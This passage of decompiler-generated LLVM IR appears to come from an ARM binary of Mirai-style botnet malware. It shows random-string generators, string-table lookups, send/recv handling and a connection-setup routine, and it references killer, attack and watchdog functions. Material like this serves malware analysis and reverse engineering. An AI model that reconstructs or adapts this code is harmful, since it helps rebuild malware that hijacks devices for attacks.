  %v6_de60 = call i32 @__libc_send(i32 %v2_de50, i32 %v2_de54, i32 2, i32 16384)
  br label %dec_label_pc_dba8

dec_label_pc_de68:                                ; preds = %dec_label_pc_dce0, %dec_label_pc_dc74
  %v0_de68 = load i32, i32* @r5, align 4
  %v1_de68 = inttoptr i32 %v0_de68 to i32*
  %v2_de68 = load i32, i32* %v1_de68, align 4
  store i32 %v2_de68, i32* %r3.global-to-local, align 4
  %v7_de6c = icmp eq i32 %v2_de68, 4
  br i1 %v7_de6c, label %dec_label_pc_da6c, label %bb45

bb45:                                             ; preds = %dec_label_pc_de68
  %v8_de70 = icmp eq i32 %v2_de68, 11
  br i1 %v8_de70, label %dec_label_pc_da6c, label %dec_label_pc_de78

dec_label_pc_de78:                                ; preds = %bb45, %dec_label_pc_dd00, %dec_label_pc_dcac
  %v2_de78 = load i32, i32* @global_var_230bc.103, align 4
  store i32 56964, i32* @lr, align 4
  %v1_de80 = icmp ne i32 %v2_de78, -1
  call void @__pseudo_cond_branch(i1 %v1_de80, i32 ptrtoint (i32* @global_var_15760.109 to i32))
  store i32 ptrtoint (i32* @global_var_230bc.103 to i32), i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @global_var_230bc.103, align 4
  %v1_de94 = call i32 @sleep(i32 1)
  br label %dec_label_pc_da6c

dec_label_pc_de9c:                                ; preds = %dec_label_pc_ddd8
  %v2_dea4 = call i32 @util_strlen(i8* %v1_dea4)
  %sext = mul i32 %v2_dea4, 16777216
  %v1_dea8 = sdiv i32 %sext, 16777216
  %v7_dea8 = inttoptr i32 %v1_dea8 to i8*
  store i8* %v7_dea8, i8** %stack_var_-42, align 4
  %v0_deac = call i32 @util_local_addr()
  %v0_deb4 = load i32, i32* @r5, align 4
  store i32 %v0_deb4, i32* %r2.global-to-local, align 4
  store i32 %v0_deac, i32* @global_var_25d48.57, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v2_dec4 = load i32, i32* @global_var_230bc.103, align 4
  %v4_dec8 = call i32 @__libc_send(i32 %v2_dec4, i32 ptrtoint (i32* @global_var_1a790.113 to i32), i32 %v0_deb4, i32 16384)
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_ded4 = load i32, i32* @global_var_230bc.103, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_dee0 = call i32 @__libc_send(i32 %v2_ded4, i32 %v2_de54, i32 1, i32 16384)
  %v3_dee4 = load i8*, i8** %stack_var_-42, align 4
  %v4_dee4 = ptrtoint i8* %v3_dee4 to i32
  store i32 %v4_dee4, i32* %r2.global-to-local, align 4
  %v3_dee8 = icmp eq i8* %v3_dee4, null
  br i1 %v3_dee8, label %dec_label_pc_da6c, label %dec_label_pc_def0

dec_label_pc_def0:                                ; preds = %dec_label_pc_de9c
  %v2_def4 = load i32, i32* @global_var_230bc.103, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_df00 = call i32 @__libc_send(i32 %v2_def4, i32 %v2_d8a8, i32 %v4_dee4, i32 16384)
  br label %dec_label_pc_da6c

dec_label_pc_df08:                                ; preds = %dec_label_pc_dcb4
  %v2_df0c = load i32, i32* @global_var_230bc.103, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_df18 = add i32 %v4_dcb8, 16384
  store i32 %v1_df18, i32* %r3.global-to-local, align 4
  %v4_df1c = call i32 @__libc_recv(i32 %v2_df0c, i32 %v2_de54, i32 2, i32 %v1_df18)
  br label %dec_label_pc_da6c

dec_label_pc_df24:                                ; preds = %dec_label_pc_dcc4
  %v2_df24 = load i32, i32* @global_var_230bc.103, align 4
  %v1_df28 = call i32 @__GI___libc_close(i32 %v2_df24)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_df30 = load i32, i32* @r8, align 4
  %v2_df30 = inttoptr i32 %v1_df30 to i32*
  store i32 -1, i32* %v2_df30, align 4
  br label %dec_label_pc_da6c

; uselistorder directives
  uselistorder i32 %v3_dd78, { 3, 2, 1, 0 }
  uselistorder i8* %v3_dd54, { 1, 0 }
  uselistorder i32 %v5_dd30, { 1, 0, 2, 3 }
  uselistorder i32 %v7_dcf4, { 1, 0 }
  uselistorder i32 %v5_dccc, { 1, 0, 3, 2 }
  uselistorder i32 %v4_dcb8, { 2, 1, 0, 3 }
  uselistorder i32 %v4_dca0, { 1, 0 }
  uselistorder i32 %v2_dc3c, { 6, 3, 2, 0, 1, 5, 4 }
  uselistorder i32 %v5_db84, { 1, 0, 2 }
  uselistorder i32 %v2_db80, { 2, 0, 1 }
  uselistorder i32 %v5_db68, { 1, 2, 0 }
  uselistorder i32 %v2_daac, { 2, 1, 0 }
  uselistorder i32 %v1_da9c, { 1, 2, 0 }
  uselistorder i32 %v1_da80, { 1, 2, 0 }
  uselistorder i32 %v2_de54, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v2_db94, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v2_da68, { 1, 0, 2 }
  uselistorder i32 %v2_d904, { 0, 10, 1, 11, 2, 9, 3, 4, 8, 7, 5, 12, 6 }
  uselistorder i32 %v2_d8ec, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_d818, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-136, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i8** %stack_var_-42, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 5, 6, 3, 4, 7, 8 }
  uselistorder i8* null, { 2, 0, 1 }
  uselistorder i32 16386, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @sleep, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_23238.105 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_23238.105, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_23238.105 to i32), { 1, 0 }
  uselistorder i32* @global_var_230bc.103, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 (i32)* @watchdog_maintain, { 1, 0 }
  uselistorder i32 (i32)* @killer_init, { 1, 0 }
  uselistorder i32 (i32)* @attack_init, { 1, 0 }
  uselistorder i32 (i32, i32)* @rand_alpha_str, { 2, 1, 0 }
  uselistorder i32* @global_var_230c0.85, { 2, 0, 3, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_d6d4.83 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i16** @global_var_25d54.89 to i32), { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %dec_label_pc_dba8, { 2, 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_daf0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_dae0, { 1, 0 }
  uselistorder label %dec_label_pc_da6c, { 7, 8, 9, 1, 10, 2, 0, 11, 12, 3, 4, 5, 13, 6, 14 }
  uselistorder label %dec_label_pc_d8bc, { 2, 0, 1 }
}

define i32 @function_df60(i32 %arg1) local_unnamed_addr {
dec_label_pc_df60:
  %v0_df60 = load i1, i1* @cpsr_c, align 1
  call void @__pseudo_cond_branch(i1 %v0_df60, i32 -22312428)
  %v0_df68 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_df68, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_df60
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_df60, %bb
  ret i32 %arg1

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @rand_next() local_unnamed_addr {
entry:
  %v2_df78 = load i32, i32* @global_var_2323c.115, align 4
  %v2_df7c = load i32, i32* @global_var_23248.117, align 4
  %v4_df88 = mul i32 %v2_df78, 2048
  %v5_df88 = xor i32 %v4_df88, %v2_df78
  store i32 %v5_df88, i32* @r3, align 4
  %v4_df8c = udiv i32 %v2_df7c, 524288
  %v5_df8c = xor i32 %v4_df8c, %v2_df7c
  %v2_df90 = load i32, i32* @global_var_23240.119, align 4
  %v2_df94 = load i32, i32* @global_var_23244.121, align 4
  %v2_df98 = xor i32 %v5_df8c, %v5_df88
  %v4_df9c = udiv i32 %v5_df88, 256
  %v5_df9c = xor i32 %v2_df98, %v4_df9c
  store i32 %v2_df90, i32* @global_var_2323c.115, align 4
  store i32 %v2_df94, i32* @global_var_23240.119, align 4
  store i32 %v2_df7c, i32* @global_var_23244.121, align 4
  store i32 %v5_df9c, i32* @global_var_23248.117, align 4
  ret i32 %v5_df9c

; uselistorder directives
  uselistorder i32 %v2_df7c, { 2, 1, 0 }
  uselistorder i32 %v2_df78, { 1, 0 }
}

define i32 @rand_init(i32 %arg1) local_unnamed_addr {
entry:
  %v2_dfd4 = call i32 @__GI_time(i32* null)
  store i32 %v2_dfd4, i32* @global_var_2323c.115, align 4
  %v1_dfe0 = call i32 @__getpid(i32 %v2_dfd4)
  store i32 %v1_dfe0, i32* @r0, align 4
  %v0_dfe8 = call i32 @getppid()
  %v2_dff0 = xor i32 %v1_dfe0, %v0_dfe8
  store i32 %v2_dff0, i32* @global_var_23240.119, align 4
  %v1_dff8 = call i32 @clock(i32 %v2_dff0)
  %v2_dffc = load i32, i32* @global_var_23240.119, align 4
  %v2_e008 = xor i32 %v2_dffc, %v1_dff8
  store i32 %v2_e008, i32* @global_var_23248.117, align 4
  store i32 %v1_dff8, i32* @global_var_23244.121, align 4
  ret i32 %v1_dff8

; uselistorder directives
  uselistorder i32 %v1_dff8, { 1, 2, 0 }
  uselistorder i32 ()* @getppid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__getpid, { 2, 1, 0 }
}

define i32 @rand_alpha_str(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_e030 = load i32, i32* @r4, align 4
  %v6_e030 = load i32, i32* @r5, align 4
  %v9_e030 = load i32, i32* @r6, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v1_e044 = call i32 @table_unlock_val(i32 28)
  %v3_e050 = call i32 @table_retrieve_val(i32 28, i32* null)
  store i32 %v3_e050, i32* @r1, align 4
  %v2_e05c = bitcast i32* %stack_var_-72 to i8*
  %v3_e05c = call i32 @strcpy(i8* %v2_e05c, i32 %v3_e050)
  %v2_e060 = icmp eq i32 %arg2, 0
  br i1 %v2_e060, label %dec_label_pc_e0dc, label %dec_label_pc_e068

dec_label_pc_e068:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2323c.115 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23240.119 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23244.121 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23248.117 to i32), i32* @r6, align 4
  store i32 0, i32* @r5, align 4
  %v2_e0c0 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_e07c

dec_label_pc_e07c:                                ; preds = %dec_label_pc_e07c.dec_label_pc_e07c_crit_edge, %dec_label_pc_e068
  %v1_e0a0 = phi i32 [ %v1_e0a0.pre, %dec_label_pc_e07c.dec_label_pc_e07c_crit_edge ], [ ptrtoint (i32* @global_var_2323c.115 to i32), %dec_label_pc_e068 ]
  %v2_e07c = load i32, i32* @global_var_23248.117, align 4
  store i32 %v2_e07c, i32* %r2.global-to-local, align 4
  %v2_e080 = load i32, i32* @global_var_2323c.115, align 4
  %v4_e084 = udiv i32 %v2_e07c, 524288
  %v5_e084 = xor i32 %v4_e084, %v2_e07c
  %v4_e088 = mul i32 %v2_e080, 2048
  %v5_e088 = xor i32 %v4_e088, %v2_e080
  %v2_e08c = xor i32 %v5_e084, %v5_e088
  %v2_e090 = load i32, i32* @global_var_23240.119, align 4
  %v2_e094 = load i32, i32* @global_var_23244.121, align 4
  store i32 %v2_e094, i32* %ip.global-to-local, align 4
  %v4_e098 = udiv i32 %v5_e088, 256
  %v5_e098 = xor i32 %v2_e08c, %v4_e098
  store i32 %v5_e098, i32* @r4, align 4
  %v2_e0a0 = inttoptr i32 %v1_e0a0 to i32*
  store i32 %v2_e090, i32* %v2_e0a0, align 4
  %v0_e0a4 = load i32, i32* %ip.global-to-local, align 4
  %v1_e0a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_e0a4 = inttoptr i32 %v1_e0a4 to i32*
  store i32 %v0_e0a4, i32* %v2_e0a4, align 4
  %v0_e0a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_e0a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_e0a8 = inttoptr i32 %v1_e0a8 to i32*
  store i32 %v0_e0a8, i32* %v2_e0a8, align 4
  %v0_e0ac = load i32, i32* @r4, align 4
  %v1_e0ac = load i32, i32* @r6, align 4
  %v2_e0ac = inttoptr i32 %v1_e0ac to i32*
  store i32 %v0_e0ac, i32* %v2_e0ac, align 4
  %v2_e0b0 = call i32 @util_strlen(i8* %v2_e05c)
  %v0_e0b8 = load i32, i32* @r4, align 4
  %v3_e0bc = urem i32 %v0_e0b8, %v2_e0b0
  %v2_e0c4 = add i32 %v3_e0bc, %v2_e0c0
  %v1_e0c8 = add i32 %v2_e0c4, -32
  %v2_e0c8 = inttoptr i32 %v1_e0c8 to i8*
  %v3_e0c8 = load i8, i8* %v2_e0c8, align 1
  %v2_e0cc = load i32, i32* @r5, align 4
  %v3_e0cc = load i32, i32* %fp.global-to-local, align 4
  %v4_e0cc = add i32 %v3_e0cc, %v2_e0cc
  %v5_e0cc = inttoptr i32 %v4_e0cc to i8*
  store i8 %v3_e0c8, i8* %v5_e0cc, align 1
  %v0_e0d0 = load i32, i32* @r5, align 4
  %v1_e0d0 = add i32 %v0_e0d0, 1
  store i32 %v1_e0d0, i32* @r5, align 4
  %v1_e0d4 = load i32, i32* %sb.global-to-local, align 4
  %v9_e0d4 = icmp eq i32 %v1_e0d0, %v1_e0d4
  br i1 %v9_e0d4, label %dec_label_pc_e0dc, label %dec_label_pc_e07c.dec_label_pc_e07c_crit_edge

dec_label_pc_e07c.dec_label_pc_e07c_crit_edge:    ; preds = %dec_label_pc_e07c
  %v1_e0a0.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e07c

dec_label_pc_e0dc:                                ; preds = %dec_label_pc_e07c, %entry
  %v1_e0e0 = call i32 @table_lock_val(i32 28)
  store i32 %v3_e030, i32* @r4, align 4
  store i32 %v6_e030, i32* @r5, align 4
  store i32 %v9_e030, i32* @r6, align 4
  ret i32 %v1_e0e0

; uselistorder directives
  uselistorder i32 %v2_e080, { 1, 0 }
  uselistorder i32 %v2_e07c, { 1, 0, 2 }
}

define i32 @rand_str(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_e100 = load i32, i32* %r1.global-to-local, align 4
  %v3_e104 = load i32, i32* @r4, align 4
  store i32 %v3_e104, i32* %stack_var_-28, align 4
  %v0_e108 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_e108, i32* %r5.global-to-local, align 4
  %tmp16 = icmp slt i32 %v0_e100, 1
  br i1 %tmp16, label %dec_label_pc_e1b0, label %dec_label_pc_e110

dec_label_pc_e110:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_23248.117 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23244.121 to i32), i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23240.119 to i32), i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2323c.115 to i32), i32* %r6.global-to-local, align 4
  %v2_e120 = load i32, i32* @global_var_23248.117, align 4
  store i32 %v2_e120, i32* %lr.global-to-local, align 4
  %v2_e124 = load i32, i32* @global_var_23244.121, align 4
  store i32 %v2_e124, i32* %r4.global-to-local, align 4
  %v2_e128 = load i32, i32* @global_var_23240.119, align 4
  store i32 %v2_e128, i32* %r0.global-to-local, align 4
  %v2_e12c = load i32, i32* @global_var_2323c.115, align 4
  br label %dec_label_pc_e150

dec_label_pc_e134:                                ; preds = %dec_label_pc_e170
  %v1_e134 = trunc i32 %v5_e160 to i16
  %v3_e134 = inttoptr i32 %v9_e164 to i16*
  store i16 %v1_e134, i16* %v3_e134, align 2
  %v4_e134 = load i32, i32* %r5.global-to-local, align 4
  %v5_e134 = add i32 %v4_e134, -2
  store i32 %v5_e134, i32* %r5.global-to-local, align 4
  %v0_e138.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e138

dec_label_pc_e138:                                ; preds = %.thread, %dec_label_pc_e134
  %v0_e138 = phi i32 [ %v9_e168, %.thread ], [ %v0_e138.pre, %dec_label_pc_e134 ]
  %v2_e1345 = phi i32 [ %v12_e164, %.thread ], [ %v5_e134, %dec_label_pc_e134 ]
  %tmp17 = icmp slt i32 %v0_e138, 1
  br i1 %tmp17, label %dec_label_pc_e1b8, label %dec_label_pc_e144

dec_label_pc_e144:                                ; preds = %dec_label_pc_e138
  %v0_e13c = load i32, i32* %r0.global-to-local, align 4
  %v0_e144 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e144, i32* %r0.global-to-local, align 4
  %v0_e148 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_e148, i32* %r4.global-to-local, align 4
  %v0_e14c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_e14c, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_e150

dec_label_pc_e150:                                ; preds = %dec_label_pc_e110, %dec_label_pc_e144
  %v0_e19c = phi i32 [ %v2_e128, %dec_label_pc_e110 ], [ %v0_e144, %dec_label_pc_e144 ]
  %v9_e164 = phi i32 [ %v0_e108, %dec_label_pc_e110 ], [ %v2_e1345, %dec_label_pc_e144 ]
  %v0_e17c = phi i32 [ %v0_e100, %dec_label_pc_e110 ], [ %v0_e138, %dec_label_pc_e144 ]
  %v0_e190 = phi i32 [ %v2_e120, %dec_label_pc_e110 ], [ %v0_e14c, %dec_label_pc_e144 ]
  %v0_e18c = phi i32 [ %v2_e12c, %dec_label_pc_e110 ], [ %v0_e13c, %dec_label_pc_e144 ]
  %v4_e150 = mul i32 %v0_e18c, 2048
  %v5_e150 = xor i32 %v4_e150, %v0_e18c
  %v4_e154 = udiv i32 %v0_e190, 524288
  %v5_e154 = xor i32 %v4_e154, %v0_e190
  %v2_e158 = xor i32 %v5_e154, %v5_e150
  %v4_e160 = udiv i32 %v5_e150, 256
  %v5_e160 = xor i32 %v2_e158, %v4_e160
  store i32 %v5_e160, i32* %r3.global-to-local, align 4
  %v7_e164 = icmp sgt i32 %v0_e17c, 3
  br i1 %v7_e164, label %.thread, label %dec_label_pc_e170

.thread:                                          ; preds = %dec_label_pc_e150
  %v10_e164 = inttoptr i32 %v9_e164 to i32*
  store i32 %v5_e160, i32* %v10_e164, align 4
  %v11_e164 = load i32, i32* %r5.global-to-local, align 4
  %v12_e164 = add i32 %v11_e164, 4
  store i32 %v12_e164, i32* %r5.global-to-local, align 4
  %v8_e168 = load i32, i32* %r1.global-to-local, align 4
  %v9_e168 = add i32 %v8_e168, -4
  store i32 %v9_e168, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_e138

dec_label_pc_e170:                                ; preds = %dec_label_pc_e150
  %v7_e17c = icmp eq i32 %v0_e17c, 1
  store i32 %v5_e160, i32* %r3.global-to-local, align 4
  %v1_e184 = add i32 %v0_e17c, -2
  store i32 %v1_e184, i32* %r1.global-to-local, align 4
  br i1 %v7_e17c, label %dec_label_pc_e18c, label %dec_label_pc_e134

dec_label_pc_e18c:                                ; preds = %dec_label_pc_e170
  store i32 %v5_e160, i32* %r3.global-to-local, align 4
  %v1_e19c = load i32, i32* %r6.global-to-local, align 4
  %v2_e19c = inttoptr i32 %v1_e19c to i32*
  store i32 %v0_e19c, i32* %v2_e19c, align 4
  %v0_e1a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_e1a0 = load i32, i32* %r7.global-to-local, align 4
  %v2_e1a0 = inttoptr i32 %v1_e1a0 to i32*
  store i32 %v0_e1a0, i32* %v2_e1a0, align 4
  %v0_e1a4 = load i32, i32* %lr.global-to-local, align 4
  %v1_e1a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_e1a4 = inttoptr i32 %v1_e1a4 to i32*
  store i32 %v0_e1a4, i32* %v2_e1a4, align 4
  %v0_e1a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1a8 = load i32, i32* %sl.global-to-local, align 4
  %v2_e1a8 = inttoptr i32 %v1_e1a8 to i32*
  store i32 %v0_e1a8, i32* %v2_e1a8, align 4
  %v0_e1ac = load i32, i32* %r3.global-to-local, align 4
  %v1_e1ac = trunc i32 %v0_e1ac to i8
  %v2_e1ac = load i32, i32* %r5.global-to-local, align 4
  %v3_e1ac = inttoptr i32 %v2_e1ac to i8*
  store i8 %v1_e1ac, i8* %v3_e1ac, align 1
  br label %dec_label_pc_e1b0

dec_label_pc_e1b0:                                ; preds = %entry, %dec_label_pc_e1b8, %dec_label_pc_e18c
  %v2_e1b0 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_e1b0, i32* @r4, align 4
  %v1_e1b4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_e1b4

dec_label_pc_e1b8:                                ; preds = %dec_label_pc_e138
  %v0_e1b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_e1b8 = load i32, i32* %sl.global-to-local, align 4
  %v2_e1b8 = inttoptr i32 %v1_e1b8 to i32*
  store i32 %v0_e1b8, i32* %v2_e1b8, align 4
  %v0_e1bc = load i32, i32* %lr.global-to-local, align 4
  %v1_e1bc = load i32, i32* %r8.global-to-local, align 4
  %v2_e1bc = inttoptr i32 %v1_e1bc to i32*
  store i32 %v0_e1bc, i32* %v2_e1bc, align 4
  %v0_e1c0 = load i32, i32* %r4.global-to-local, align 4
  %v1_e1c0 = load i32, i32* %r7.global-to-local, align 4
  %v2_e1c0 = inttoptr i32 %v1_e1c0 to i32*
  store i32 %v0_e1c0, i32* %v2_e1c0, align 4
  %v0_e1c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_e1c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_e1c4 = inttoptr i32 %v1_e1c4 to i32*
  store i32 %v0_e1c4, i32* %v2_e1c4, align 4
  br label %dec_label_pc_e1b0

; uselistorder directives
  uselistorder i32 %v9_e168, { 1, 0 }
  uselistorder i32 %v12_e164, { 1, 0 }
  uselistorder i32 %v5_e160, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_e18c, { 1, 0 }
  uselistorder i32 %v0_e190, { 1, 0 }
  uselistorder i32 %v0_e17c, { 1, 0, 2 }
  uselistorder i32 %v0_e138, { 1, 0 }
  uselistorder i32 %v0_e100, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 4, 0, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 4, 0, 1, 2, 3, 6, 5 }
  uselistorder i32* %r1.global-to-local, { 3, 5, 4, 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 2, 5, 6, 0, 1 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_2323c.115, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_2323c.115 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_23240.119, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_23244.121, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_23248.117, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_e1b0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e150, { 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e1dc = load i32, i32* @r4, align 4
  store i32 %v3_e1dc, i32* %stack_var_-16, align 4
  %v6_e1dc = load i32, i32* @r5, align 4
  %v9_e1dc = load i32, i32* @r6, align 4
  %v12_e1dc = load i32, i32* @lr, align 4
  %v0_e1e0 = load i32, i32* @r0, align 4
  store i32 %v0_e1e0, i32* @r5, align 4
  %v1_e1e4 = add i32 %v0_e1e0, 4
  %v2_e1e4 = inttoptr i32 %v1_e1e4 to i32*
  %v3_e1e4 = load i32, i32* %v2_e1e4, align 4
  store i32 %v3_e1e4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 57864, i32* @lr, align 4
  %v1_e204 = icmp ne i32 %v3_e1e4, -1
  call void @__pseudo_cond_branch(i1 %v1_e204, i32 ptrtoint (i32* @global_var_15760.109 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_e210 = load i32, i32* @r6, align 4
  store i32 %v0_e210, i32* %r2.global-to-local, align 4
  %v3_e214 = call i32 @socket(i32 2, i32 1, i32 %v0_e210)
  store i32 %v3_e214, i32* %r0.global-to-local, align 4
  %v7_e218 = icmp eq i32 %v3_e214, -1
  %v1_e21c = load i32, i32* @r5, align 4
  %v2_e21c = add i32 %v1_e21c, 4
  %v3_e21c = inttoptr i32 %v2_e21c to i32*
  store i32 %v3_e214, i32* %v3_e21c, align 4
  br i1 %v7_e218, label %entry.dec_label_pc_e294_crit_edge, label %dec_label_pc_e224

entry.dec_label_pc_e294_crit_edge:                ; preds = %entry
  %v1_e29c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e294

dec_label_pc_e224:                                ; preds = %entry
  %v2_e1e8 = ptrtoint i32* %stack_var_-32 to i32
  %v0_e224 = load i32, i32* @r5, align 4
  %v1_e224 = add i32 %v0_e224, 28
  store i32 %v1_e224, i32* @r0, align 4
  %v0_e228 = load i32, i32* @r6, align 4
  %v2_e228 = add i32 %v0_e224, 24
  %v3_e228 = inttoptr i32 %v2_e228 to i32*
  store i32 %v0_e228, i32* %v3_e228, align 4
  store i32 256, i32* @r1, align 4
  %v0_e230 = call i32 @util_zero()
  store i32 %v0_e230, i32* %r0.global-to-local, align 4
  %v0_e234 = load i32, i32* @r5, align 4
  %v1_e234 = add i32 %v0_e234, 4
  %v2_e234 = inttoptr i32 %v1_e234 to i32*
  %v3_e234 = load i32, i32* %v2_e234, align 4
  store i32 %v3_e234, i32* @r4, align 4
  %v0_e238 = load i32, i32* @r6, align 4
  store i32 %v0_e238, i32* @r2, align 4
  store i32 %v3_e234, i32* %r0.global-to-local, align 4
  %v2_e244 = call i32 @__libc_fcntl(i32 %v3_e234, i32 3)
  %v1_e24c = or i32 %v2_e244, 2048
  store i32 %v1_e24c, i32* @r2, align 4
  %v0_e250 = load i32, i32* @r4, align 4
  store i32 %v0_e250, i32* %r0.global-to-local, align 4
  %v2_e254 = call i32 @__libc_fcntl(i32 %v0_e250, i32 4)
  store i32 %v2_e254, i32* %r0.global-to-local, align 4
  %v2_e25c = load i32, i32* @global_var_23280.135, align 4
  store i32 %v2_e25c, i32* %r2.global-to-local, align 4
  %v1_e264 = load i32, i32* @r5, align 4
  %v2_e264 = add i32 %v1_e264, 12
  %v3_e264 = inttoptr i32 %v2_e264 to i32*
  store i32 1, i32* %v3_e264, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_e270 = load i32, i32* %r2.global-to-local, align 4
  %v1_e270 = load i32, i32* @r5, align 4
  %v2_e270 = add i32 %v1_e270, 8
  %v3_e270 = inttoptr i32 %v2_e270 to i32*
  store i32 %v0_e270, i32* %v3_e270, align 4
  %v0_e274 = load i32, i32* @r5, align 4
  %v1_e278 = add i32 %v0_e274, 4
  %v2_e278 = inttoptr i32 %v1_e278 to i32*
  %v3_e278 = load i32, i32* %v2_e278, align 4
  store i32 %v3_e278, i32* %r0.global-to-local, align 4
  %v1_e27c = add i32 %v0_e274, 20
  %v2_e27c = inttoptr i32 %v1_e27c to i16*
  %v3_e27c = load i16, i16* %v2_e27c, align 2
  %v4_e27c = zext i16 %v3_e27c to i32
  store i32 %v4_e27c, i32* @r5, align 4
